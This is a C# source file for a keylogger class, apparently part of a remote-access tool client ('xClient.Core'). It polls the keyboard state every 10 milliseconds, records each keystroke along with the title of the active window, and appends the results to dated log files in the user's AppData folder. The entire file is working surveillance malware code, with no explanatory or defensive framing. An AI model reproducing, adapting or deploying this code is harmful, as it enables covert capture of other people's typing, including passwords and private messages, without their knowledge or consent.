using System;
using System.IO;
using System.Text;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.Collections.Generic;

namespace xClient.Core
{
    public class Logger
    {
        [DllImport("User32.dll")]
        private static extern short GetAsyncKeyState(Keys vKey);

        [DllImport("User32.dll")]
        private static extern short GetAsyncKeyState(int vKey);

        [DllImport("User32.dll")]
        public static extern int GetWindowText(int hwnd, StringBuilder s, int nMaxCount);

        [DllImport("User32.dll")]
        public static extern int GetForegroundWindow();

        public bool Enabled
        {
            get
            {
                return timerLogKeys.Enabled && timerFlush.Enabled;
            }
            set
            {
                timerLogKeys.Enabled = timerFlush.Enabled = value;
            }
        }

        public static bool ShiftKey
        {
            get
            {
                return Convert.ToBoolean(GetAsyncKeyState(Keys.ShiftKey) & 0x8000);
            }
        }

        private string keyBuffer;
        private string hWndTitle;
        private string hWndLastTitle;
        private string filePath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Logs\\";

        private List<int> enumValues;

        private System.Timers.Timer timerLogKeys;
        private System.Timers.Timer timerFlush;

        public Logger(double flushInterval)
        {
            hWndTitle = GetActiveWindowTitle();

            hWndLastTitle = hWndTitle;

            WriteFile();

            #region KeyEnumValues
            enumValues = new List<int>()
            {
               8,
               9,
               13,
               32,
               46,
               92
            };

            for (int i = 48; i <= 57; i++)
            {
                enumValues.Add(i);
            }

            for (int i = 65; i <= 122; i++)
            {
                enumValues.Add(i);
            }

            for (int i = 186; i <= 192; i++)
            {
                enumValues.Add(i);
            }

            for (int i = 219; i <= 222; i++)
            {
                enumValues.Add(i);
            }
            #endregion

            this.timerLogKeys = new System.Timers.Timer();
            this.timerLogKeys.Enabled = true;
            this.timerLogKeys.Elapsed += new System.Timers.ElapsedEventHandler(this.timerLogKeys_Elapsed);
            this.timerLogKeys.Interval = 10;

            this.timerFlush = new System.Timers.Timer();
            this.timerFlush.Enabled = true;
            this.timerFlush.Elapsed += new System.Timers.ElapsedEventHandler(this.timerFlush_Elapsed);
            this.timerFlush.Interval = flushInterval;
        }

        public static string GetActiveWindowTitle()
        {
            int hwnd = GetForegroundWindow();

            StringBuilder sbTitle = new StringBuilder(1024);

            int intLength = GetWindowText(hwnd, sbTitle, sbTitle.Capacity);

            string title = sbTitle.ToString();

            return title != "" ? title : null;
        }

        private void timerLogKeys_Elapsed(object sender, System.Timers.ElapsedEventArgs e)
        {
            hWndTitle = GetActiveWindowTitle();

            foreach (int i in enumValues)
            {
                if (GetAsyncKeyState(i) == -32767)
                {
                    if (hWndTitle != null)
                    {
                        if (hWndTitle != hWndLastTitle)
                        {
                            hWndLastTitle = hWndTitle;

                            keyBuffer += "\n\n[" + hWndTitle + "]\n";
                        }
                    }

                    if (i.ToString() == "8") //Backspace
                        keyBuffer += "[Back]";
                    else if (i.ToString() == "9") //Tab
                        keyBuffer += "[Tab]";
                    else if (i.ToString() == "13") //Enter
                        keyBuffer += "[Enter]\n";
                    else if (i.ToString() == "32") //Spacebar
                        keyBuffer += " ";
                    else if (i.ToString() == "46") //Delete
                        keyBuffer += "[Del]";

                    if (ShiftKey)
                    {
                        if (i >= 65 && i <= 122)
                        {
                            keyBuffer += (char)i; //A-Z
                        }
                        else if (i.ToString() == "48")
                            keyBuffer += ")";
                        else if (i.ToString() == "49")
                            keyBuffer += "!";
                        else if (i.ToString() == "50")
                            keyBuffer += "@";
                        else if (i.ToString() == "51")
                            keyBuffer += "#";
                        else if (i.ToString() == "52")
                            keyBuffer += "$";
                        else if (i.ToString() == "53")
                            keyBuffer += "%";
                        else if (i.ToString() == "54")
                            keyBuffer += "^";
                        else if (i.ToString() == "55")
                            keyBuffer += "&";
                        else if (i.ToString() == "56")
                            keyBuffer += "*";
                        else if (i.ToString() == "57")
                            keyBuffer += "(";
                        else if (i.ToString() == "186")
                            keyBuffer += ":";
                        else if (i.ToString() == "187")
                            keyBuffer += "+";
                        else if (i.ToString() == "188")
                            keyBuffer += "<";
                        else if (i.ToString() == "189")
                            keyBuffer += "_";
                        else if (i.ToString() == "190")
                            keyBuffer += ">";
                        else if (i.ToString() == "191")
                            keyBuffer += "?";
                        else if (i.ToString() == "192")
                            keyBuffer += "~";
                        else if (i.ToString() == "219")
                            keyBuffer += "{";
                        else if (i.ToString() == "220")
                            keyBuffer += "|";
                        else if (i.ToString() == "221")
                            keyBuffer += "}";
                        else if (i.ToString() == "222")
                            keyBuffer += "\"";
                    }
                    else
                    {
                        if (i >= 65 && i <= 122)
                        {
                            keyBuffer += (char)(i + 32); //a-z
                        }
                        else if (i.ToString() == "48")
                            keyBuffer += "0";
                        else if (i.ToString() == "49")
                            keyBuffer += "1";
                        else if (i.ToString() == "50")
                            keyBuffer += "2";
                        else if (i.ToString() == "51")
                            keyBuffer += "3";
                        else if (i.ToString() == "52")
                            keyBuffer += "4";
                        else if (i.ToString() == "53")
                            keyBuffer += "5";
                        else if (i.ToString() == "54")
                            keyBuffer += "6";
                        else if (i.ToString() == "55")
                            keyBuffer += "7";
                        else if (i.ToString() == "56")
                            keyBuffer += "8";
                        else if (i.ToString() == "57")
                            keyBuffer += "9";
                        else if (i.ToString() == "92")
                            keyBuffer += "`";
                        else if (i.ToString() == "186")
                            keyBuffer += ";";
                        else if (i.ToString() == "187")
                            keyBuffer += "=";
                        else if (i.ToString() == "188")
                            keyBuffer += ",";
                        else if (i.ToString() == "189")
                            keyBuffer += "-";
                        else if (i.ToString() == "190")
                            keyBuffer += ".";
                        else if (i.ToString() == "191")
                            keyBuffer += "/";
                        else if (i.ToString() == "219")
                            keyBuffer += "[";
                        else if (i.ToString() == "220")
                            keyBuffer += "\\";
                        else if (i.ToString() == "221")
                            keyBuffer += "]";
                        else if (i.ToString() == "222")
                            keyBuffer += "'";
                    }
                }
            }
        }

        private void timerFlush_Elapsed(object sender, System.Timers.ElapsedEventArgs e)
        {
            if (keyBuffer.Length > 0)
                WriteFile();
        }

        private void WriteFile()
        {
            bool writeHeader = false;

            string fileName = filePath + DateTime.Now.ToString("MM-dd-yyyy");

            try
            {
                if (!Directory.Exists(filePath))
                    Directory.CreateDirectory(filePath);

                if (!File.Exists(fileName))
                    writeHeader = true;

                using (FileStream fileStream = new FileStream(fileName, FileMode.Append, FileAccess.Write))
                {
                    using (StreamWriter sw = new StreamWriter(fileStream))
                    {
                        try
                        {
                            if (writeHeader)
                                sw.Write("Log created on " + DateTime.Now.ToString("MM-dd-yyyy") + "\n");
                            else
                                sw.Write(keyBuffer);
                        }
                        catch
                        { }
                    }
                }
            }
            catch
            { }

            keyBuffer = "";
        }
    }
}
 
